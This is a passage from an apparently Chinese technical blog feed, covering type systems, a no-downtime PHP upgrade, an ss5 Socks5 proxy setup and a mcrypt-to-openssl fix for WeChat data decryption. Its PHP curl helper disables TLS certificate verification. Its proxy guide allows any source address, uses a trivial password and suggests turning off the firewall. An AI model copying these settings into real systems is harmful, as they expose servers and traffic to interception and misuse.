<th align="left">语言</th>
<th align="left">类型</th>
</tr>
</thead>
<tbody><tr>
<td align="left">汇编</td>
<td align="left">无类型</td>
</tr>
<tr>
<td align="left">C/C++</td>
<td align="left">弱类型、静态类型</td>
</tr>
<tr>
<td align="left">Perl/PHP</td>
<td align="left">弱类型、动态类型检查</td>
</tr>
<tr>
<td align="left">Java/C#</td>
<td align="left">强类型、静态类型检查</td>
</tr>
<tr>
<td align="left">Python, Scheme</td>
<td align="left">强类型、动态类型检查</td>
</tr>
<tr>
<td align="left">Java/C</td>
<td align="left">静态显式类型</td>
</tr>
<tr>
<td align="left">Ocaml, Haskell</td>
<td align="left">静态隐式类型</td>
</tr>
</tbody></table>
<p>弱类型：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&gt; <span class="string">"1"</span>+<span class="number">2</span></span><br><span class="line"></span><br><span class="line">&gt; <span class="string">'12'</span></span><br></pre></td></tr></table></figure>

<p>强类型：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">"1"</span>+<span class="number">2</span></span><br><span class="line"></span><br><span class="line">Traceback (most recent call last):  File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;TypeError: cannot concatenate <span class="string">'str'</span> <span class="keyword">and</span> <span class="string">'int'</span> objects动态类型：</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>type(a)</span><br><span class="line"></span><br><span class="line">&lt;type <span class="string">'int'</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = <span class="string">"s"</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>type(a)</span><br><span class="line"></span><br><span class="line">&lt;type <span class="string">'str'</span>&gt;</span><br></pre></td></tr></table></figure>

<p>静态类型：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">Prelude&gt; let a = <span class="string">"123"</span> :: Int</span><br><span class="line"></span><br><span class="line">&lt;interactive&gt;:<span class="number">2</span>:<span class="number">9</span>:</span><br><span class="line"></span><br><span class="line">Couldn<span class="string">'t match expected type `Int'</span> <span class="keyword">with</span> actual type `[Char]<span class="string">'    In the expression: "123" :: Int    In an equation for `a'</span>: a = <span class="string">"123"</span> :: Int</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>服务器运维</category>
      </categories>
      <tags>
        <tag>c++</tag>
        <tag>java</tag>
        <tag>php</tag>
        <tag>强、弱类型，静态、动态类型</tag>
      </tags>
  </entry>
  <entry>
    <title>平滑升级PHP版本</title>
    <url>/articles/%E5%B9%B3%E6%BB%91%E5%8D%87%E7%BA%A7PHP%E7%89%88%E6%9C%AC/</url>
    <content><![CDATA[<p>网上能搜到的中文内容，根本不算无缝升级，既然敢叫无缝升级，那就是真的不关机，不中断服务，并且还能保证出问题能100%退回原来的版本。  </p>
<h3 id="一、获取原来的编译参数"><a href="#一、获取原来的编译参数" class="headerlink" title="一、获取原来的编译参数"></a>一、获取原来的编译参数</h3><p>使用命令   </p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">php -i | grep configure</span><br></pre></td></tr></table></figure>

<p><img src="/articles/平滑升级PHP版本/1.png" alt></p>
<p>把 ‘’ 去掉就是原来的编译参数</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./configure  --prefix=/usr/local/php --with-config-file-path=/usr/local/php/etc --enable-inline-optimization --disable-debug --disable-rpath --enable-shared --enable-opcache --enable-fpm --with-fpm-user=www --with-fpm-group=www --with-mysqli=mysqlnd --with-pdo-mysql=mysqlnd --with-gettext --enable-mbstring --with-iconv --with-mcrypt --with-mhash --with-openssl --enable-bcmath --enable-soap --with-libxml-dir --enable-pcntl --enable-shmop --enable-sysvmsg --enable-sysvsem --enable-sysvshm --enable-sockets --with-curl --with-zlib --enable-zip --with-bz2 --with-readline --with-gd --enable-gd-native-ttf --enable-gd-jis-conv</span><br></pre></td></tr></table></figure>

<p>更改其中安装目录防止与现有版本冲突</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">--prefix=/usr/local/php/ --with-config-file-path=/usr/local/php/etc/</span><br></pre></td></tr></table></figure>

<p>现在改成</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">--prefix=/usr/local/php7.3/ --with-config-file-path=/usr/local/php7.3/etc/</span><br></pre></td></tr></table></figure>

<p>然后就生成 Makefile 文件， <code>make &amp;&amp; make install</code> 这里没什么好说的。  </p>
<h3 id="二、复制配置文件"><a href="#二、复制配置文件" class="headerlink" title="二、复制配置文件"></a>二、复制配置文件</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">mv PHP7.3安装目录/etc/php-fpm.conf.default        PHP7.3安装目录/etc/php-fpm.conf</span><br><span class="line"></span><br><span class="line">mv PHP7.3源码目录/php.ini-development             PHP7.3安装目录/etc/php.ini</span><br><span class="line"></span><br><span class="line">mv PHP7.3安装目录/etc/php-fpm.d/www.conf.default  PHP7.3安装目录/etc/php-fpm.d/www.conf</span><br></pre></td></tr></table></figure>


<h3 id="三、修改新的配置文件"><a href="#三、修改新的配置文件" class="headerlink" title="三、修改新的配置文件"></a>三、修改新的配置文件</h3><ol>
<li><p>php.ini 里面的扩展库路径，否则将会抛出警告，扩展不可用</p>
</li>
<li><p>php-fpm.conf 里面的 include=/usr/local/php7.3/etc/php-fpm.d/*.conf  </p>
</li>
<li><p><a href="http://www.conf" target="_blank" rel="noopener">www.conf</a> 里面的 listen  </p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">;listen = 127.0.0.1:9000 ;原</span><br><span class="line"></span><br><span class="line">listen = 127.0.0.1:9001 ;新</span><br></pre></td></tr></table></figure>

</li>
</ol>
<p>新旧版本各监听不同端口。  </p>
<h3 id="四、启动新的-php-fpm"><a href="#四、启动新的-php-fpm" class="headerlink" title="四、启动新的 php-fpm"></a>四、启动新的 php-fpm</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/usr/local/php7.3/sbin/php-fpm</span><br></pre></td></tr></table></figure>

<p>此时两个版本将共同存在   </p>
<h3 id="五、测试新的-php-fpm"><a href="#五、测试新的-php-fpm" class="headerlink" title="五、测试新的 php-fpm"></a>五、测试新的 php-fpm</h3><p>打开你的 nginx 配置文件，找到  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> location ~ \.php$ &#123;</span><br><span class="line">	fastcgi_pass   127.0.0.1:9001; # 改成新的端口</span><br><span class="line">	fastcgi_index  index.php; </span><br><span class="line">	fastcgi_param  SCRIPT_FILENAME $document_root$fastcgi_script_name;</span><br><span class="line">	include        fastcgi_params;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>修改成新的监听地址, 重新载入 nginx 配置文件  </p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nginx -s reload</span><br></pre></td></tr></table></figure>

<p>测试网站没有问题就关掉旧版本的 php-fpm，有问题就修改 nginx 配置文件，使用旧的 php-fpm。</p>
<h3 id="六、总结"><a href="#六、总结" class="headerlink" title="六、总结"></a>六、总结</h3><p>大家可能也看出来了，这种升级方式事实上就是主机上安装多版本PHP，然后进行php-fpm的切换而已。这种方式不仅适用于PHP，其他如mysql,redis等均可适用。但是需要注意各个版本之间的代码差别，防止因版本改变而产生语法错误。</p>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
  </entry>
  <entry>
    <title>搭建Socks5代理</title>
    <url>/articles/%E6%90%AD%E5%BB%BASocks5%E4%BB%A3%E7%90%86/</url>
    <content><![CDATA[<p>最近在做<a href="https://app.ya2.top/model/?from=article" target="_blank" rel="noopener">3D模型下载</a>时发现本地可以运行的代码放到服务器就跑不动了，抓包发现是服务器端无法访问三方接口，所以想到使用代理访问，同时记录下整个代理搭建过程。</p>
<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><ul>
<li>下载： <a href="http://sourceforge.net/projects/ss5/files/" target="_blank" rel="noopener">http://sourceforge.net/projects/ss5/files/</a><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tar zxvf ss5-3.8.9-8.tar.gz</span><br><span class="line">cd ss5-3.8.9-8</span><br><span class="line">./configure //默认是1080端口，如果想改端口的话，./configure --with-defaultport=10900</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>默认安装目录在：/etc/opt/ss5</p>
<p>若出现报错：</p>
<blockquote>
<p>configure: error: <strong>* Some of the headers weren’t found *</strong></p>
</blockquote>
<p>则 需要安装：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum -y install pam-devel</span><br></pre></td></tr></table></figure>

<p>如果出现报错：</p>
<blockquote>
<p>SS5OpenLdap.c:29:18: fatal error: ldap.h: No such file or directory</p>
</blockquote>
<p>安装</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum -y install openldap-devel</span><br></pre></td></tr></table></figure>

<ul>
<li>修改配置</li>
</ul>
<p>/etc/opt/ss5/ss5.conf内容全部删除，仅添加内容：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">auth 0.0.0.0/0 - u</span><br><span class="line">permit u 0.0.0.0/0 - 0.0.0.0/0 - - - - -</span><br></pre></td></tr></table></figure>

<ul>
<li>添加账户</li>
</ul>
<p>/etc/opt/ss5/ss5.passwd中添加用户名与密码：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ss5 pass</span><br></pre></td></tr></table></figure>

<ul>
<li>启动socks5</li>
</ul>
<p>默认情况ss5文件没有执行权限，如果觉得使用sh来启动麻烦，那么按如下方法：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chmod u+x /etc/rc.d/init.d/ss5</span><br><span class="line">chkconfig --add ss5 //可选</span><br><span class="line">chkconfig ss5 on //可选</span><br><span class="line">service ss5 start</span><br></pre></td></tr></table></figure>

<p>注意：如果你服务器开了防火墙不要忘了关掉，或者iptables里做下策略</p>
<h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><p>通用规则: curl -x [schema]://[user]:[pass]@[host]:[post] [URI] (-v 查询执行过程)</p>
<ul>
<li>crul 版本 &gt;= 7.21.7 时使用命令:</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -x socks5h://localhost:10800 http://www.google.com/</span><br></pre></td></tr></table></figure>

<ul>
<li>crul 版本 &gt;= 7.18.0 时使用命令:</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl --socks5-hostname localhost:10800 http://www.google.com/</span><br></pre></td></tr></table></figure>

<p>许多工具在内部使用libcurl，或者在安装程序脚本中使用curl命令。如果很难修改命令行本身，可以使用环境变量设置代理。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">env ALL_PROXY=socks5h://localhost:10800 PROGRAM [OPTION]...</span><br></pre></td></tr></table></figure>

<p>如果你想覆盖系统代理设置，你可能还需要设置两个额外的变量:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">env http_proxy=socks5h://localhost:10800 HTTPS_PROXY=socks5h://localhost:10800 ALL_PROXY=socks5h://localhost:10800 PROGRAM [OPTION]...</span><br></pre></td></tr></table></figure>

<p>注意: <code>http_proxy</code>是<strong>小</strong>写的，其他两个是<strong>大</strong>写的。</p>
<p>在代码中使用：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">http_post</span><span class="params">($sUrl, $aData, $aHeader = null, $proxy = false)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	$ch = curl_init();</span><br><span class="line">	curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="keyword">true</span>);</span><br><span class="line">	curl_setopt($ch, CURLOPT_URL, $sUrl);</span><br><span class="line">	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, <span class="keyword">false</span>);</span><br><span class="line">	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, <span class="keyword">false</span>);</span><br><span class="line">	curl_setopt($ch, CURLOPT_TIMEOUT, <span class="number">10</span>);</span><br><span class="line">	curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">	curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">	curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>]);</span><br><span class="line">	<span class="keyword">if</span> ($proxy) &#123;</span><br><span class="line">		curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5); <span class="comment">// Sockes5代理</span></span><br><span class="line">		curl_setopt($ch, CURLOPT_PROXY, HOST); 				   <span class="comment">// HOST：代理服务器</span></span><br><span class="line">		curl_setopt($ch, CURLOPT_PROXYPORT, PORT);			   <span class="comment">// PORT: 代理端口</span></span><br><span class="line">		curl_setopt($ch, CURLOPT_PROXYUSERPWD, <span class="string">'USER:PASS'</span>);   <span class="comment">// USER: 账号  PASS:密码 (注意账号密码之间有一个 ':' )</span></span><br><span class="line">	&#125;</span><br><span class="line">	!is_null($aHeader) &amp;&amp; curl_setopt($ch, CURLOPT_HTTPHEADER, $aHeader);</span><br><span class="line">	curl_setopt($ch, CURLOPT_POST, <span class="keyword">true</span>);</span><br><span class="line">	curl_setopt($ch, CURLOPT_POSTFIELDS, $aData);</span><br><span class="line">	$sResult = curl_exec($ch);</span><br><span class="line">	<span class="keyword">if</span> ($sError = curl_error($ch)) &#123;</span><br><span class="line">		response(curl_errno($ch), $sError);</span><br><span class="line">	&#125;</span><br><span class="line">	curl_close($ch);</span><br><span class="line">	<span class="keyword">return</span> $sResult;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>服务器运维</category>
      </categories>
  </entry>
  <entry>
    <title>微信小程序敏感信息解密代码中Mcrypt被PHP7.1废弃的解决方案</title>
    <url>/articles/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E8%A7%A3%E5%AF%86%E4%BB%A3%E7%A0%81%E4%B8%ADMcrypt%E8%A2%ABPHP7-1%E5%BA%9F%E5%BC%83%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/</url>
    <content><![CDATA[<h3 id="一、问题"><a href="#一、问题" class="headerlink" title="一、问题"></a>一、问题</h3><p>微信小程序开发的加解密demo代码中，使用了 Mcrypt ，而mcrypt在php7.1已经算是被废弃了。强制使用将会出现如下问题:</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"message"</span>:<span class="string">"Function mcrypt_module_open() is deprecated"</span>,</span><br><span class="line">    <span class="attr">"status_code"</span>:<span class="number">500</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="二、解决"><a href="#二、解决" class="headerlink" title="二、解决"></a>二、解决</h3><p>主要是在 Prpcrypt 这个类里面中使用的代码</p>
<ul>
<li>之前的代码：</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    * 对密文进行解密</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> string $aesCipher 需要解密的密文</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> string $aesIV 解密的初始向量</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@return</span> array 解密得到的明文</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">decrypt</span><span class="params">($aesCipher, $aesIV)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">        $module = mcrypt_module_open(MCRYPT_RIJNDAEL_128, <span class="string">''</span>, MCRYPT_MODE_CBC, <span class="string">''</span>);<span class="comment">// 此处php &lt; 7.1 支持</span></span><br><span class="line"></span><br><span class="line">        mcrypt_generic_init($module, <span class="keyword">$this</span>-&gt;key, $aesIV);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//解密</span></span><br><span class="line">        $decrypted = mdecrypt_generic($module, $aesCipher);</span><br><span class="line">        mcrypt_generic_deinit($module);</span><br><span class="line">        mcrypt_module_close($module);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(ErrorCode::$IllegalBuffer, <span class="keyword">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>修改之后的代码：</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 对密文进行解密</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> string $aesCipher 需要解密的密文</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> string $aesIV 解密的初始向量</span></span><br><span class="line"><span class="comment">* <span class="doctag">@return</span> array 解密得到的明文</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">decrypt</span><span class="params">($aesCipher, $aesIV)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">//解密</span></span><br><span class="line">        $decrypted = openssl_decrypt($aesCipher, <span class="string">'aes-128-cbc'</span>, <span class="keyword">$this</span>-&gt;key, OPENSSL_RAW_DATA, $aesIV);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (\<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">        <span class="keyword">return</span> [ErrorCode::$IllegalBuffer, <span class="keyword">null</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">//去除补位字符</span></span><br><span class="line">        $pkc_encoder = <span class="keyword">new</span> PKCS7Encoder;</span><br><span class="line">        $result = $pkc_encoder-&gt;decode($decrypted);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (\<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">        <span class="keyword">return</span> [ErrorCode::$IllegalBuffer, <span class="keyword">null</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> [<span class="number">0</span>, $result];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="三、注意"><a href="#三、注意" class="headerlink" title="三、注意"></a>三、注意</h3><p>需要安装openssl扩展！！</p>
<h3 id="四、DEMO"><a href="#四、DEMO" class="headerlink" title="四、DEMO"></a>四、DEMO</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Extend</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WxDataDecrypt</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $appid;</span><br><span class="line">    <span class="keyword">private</span> $sessionKey;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 构造函数</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> $sessionKey string 用户在小程序登录后获取的会话密钥</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> $appId string 小程序的appId</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($appid, $sessionKey)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sessionKey = $sessionKey;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;appid = $appid;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 检验数据的真实性，并且获取解密后的明文.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> $encryptedData string 加密的用户数据</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> $iv string 与用户数据一同返回的初始向量</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> $data string 解密后的原文</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> int 成功0，失败返回对应的错误码</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">decryptData</span><span class="params">($encryptedData, $iv, &amp;$data)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (strlen(<span class="keyword">$this</span>-&gt;sessionKey) != <span class="number">24</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> ErrorCode::$IllegalAesKey;</span><br><span class="line">        &#125;</span><br><span class="line">        $aesKey = base64_decode(<span class="keyword">$this</span>-&gt;sessionKey);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (strlen($iv) != <span class="number">24</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> ErrorCode::$IllegalIv;</span><br><span class="line">        &#125;</span><br><span class="line">        $aesIV = base64_decode($iv);</span><br><span class="line"></span><br><span class="line">        $aesCipher = base64_decode($encryptedData);</span><br><span class="line"></span><br><span class="line">        $pc = <span class="keyword">new</span> Prpcrypt($aesKey);</span><br><span class="line">        $result = $pc-&gt;decrypt($aesCipher, $aesIV);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($result[<span class="number">0</span>] != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> $result[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $dataObj = json_decode($result[<span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">if</span> ($dataObj == <span class="keyword">NULL</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> ErrorCode::$IllegalBuffer;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ($dataObj-&gt;watermark-&gt;appid != <span class="keyword">$this</span>-&gt;appid) &#123;</span><br><span class="line">            <span class="keyword">return</span> ErrorCode::$IllegalBuffer;</span><br><span class="line">        &#125;</span><br><span class="line">        $data = $result[<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">return</span> ErrorCode::$OK;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * PKCS7Encoder class</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 提供基于PKCS7算法的加解密接口.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PKCS7Encoder</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> $block_size = <span class="number">32</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 对需要加密的明文进行填充补位</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $text 需要进行填充补位操作的明文</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> string 补齐明文字符串</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">encode</span><span class="params">($text)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $block_size = <span class="keyword">self</span>::$block_size;</span><br><span class="line">        $text_length = strlen($text);</span><br><span class="line">        <span class="comment">//计算需要填充的位数</span></span><br><span class="line">        $amount_to_pad = $block_size - ($text_length % $block_size);</span><br><span class="line">        <span class="keyword">if</span> ($amount_to_pad == <span class="number">0</span>)</span><br><span class="line">            $amount_to_pad = $block_size;</span><br><span class="line">        <span class="comment">//获得补位所用的字符</span></span><br><span class="line">        $pad_chr = chr($amount_to_pad);</span><br><span class="line">        $tmp = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">for</span> ($index = <span class="number">0</span>; $index &lt; $amount_to_pad; $index++)</span><br><span class="line">            $tmp .= $pad_chr;</span><br><span class="line">        <span class="keyword">return</span> $text . $tmp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 对解密后的明文进行补位删除</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $text 解密后的明文</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> string 删除填充补位后的明文</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">decode</span><span class="params">($text)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $pad = ord(substr($text, <span class="number">-1</span>));</span><br><span class="line">        <span class="keyword">if</span> ($pad &lt; <span class="number">1</span> || $pad &gt; <span class="keyword">self</span>::$block_size)</span><br><span class="line">            $pad = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> substr($text, <span class="number">0</span>, (strlen($text) - $pad));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Prpcrypt class</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Prpcrypt</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $key;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($key)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;key = $key;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 对密文进行解密</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $aesCipher 需要解密的密文</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $aesIV 解密的初始向量</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array 解密得到的明文</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">decrypt</span><span class="params">($aesCipher, $aesIV)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//解密</span></span><br><span class="line">            $decrypted = openssl_decrypt($aesCipher, <span class="string">'aes-128-cbc'</span>, <span class="keyword">$this</span>-&gt;key, OPENSSL_RAW_DATA, $aesIV);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (\<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">            <span class="keyword">return</span> [ErrorCode::$IllegalBuffer, <span class="keyword">null</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//去除补位字符</span></span><br><span class="line">            $pkc_encoder = <span class="keyword">new</span> PKCS7Encoder;</span><br><span class="line">            $result = $pkc_encoder-&gt;decode($decrypted);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (\<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">            <span class="keyword">return</span> [ErrorCode::$IllegalBuffer, <span class="keyword">null</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> [<span class="number">0</span>, $result];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * error code 说明.</span></span><br><span class="line"><span class="comment"> * &lt;ul&gt;</span></span><br><span class="line"><span class="comment"> *    &lt;li&gt;-41001: encodingAesKey 非法&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *    &lt;li&gt;-41003: aes 解密失败&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *    &lt;li&gt;-41004: 解密后得到的buffer非法&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *    &lt;li&gt;-41005: base64加密失败&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *    &lt;li&gt;-41016: base64解密失败&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> * &lt;/ul&gt;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ErrorCode</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> $OK = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> $IllegalAesKey = <span class="number">-41001</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> $IllegalIv = <span class="number">-41002</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> $IllegalBuffer = <span class="number">-41003</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> $DecodeBase64Error = <span 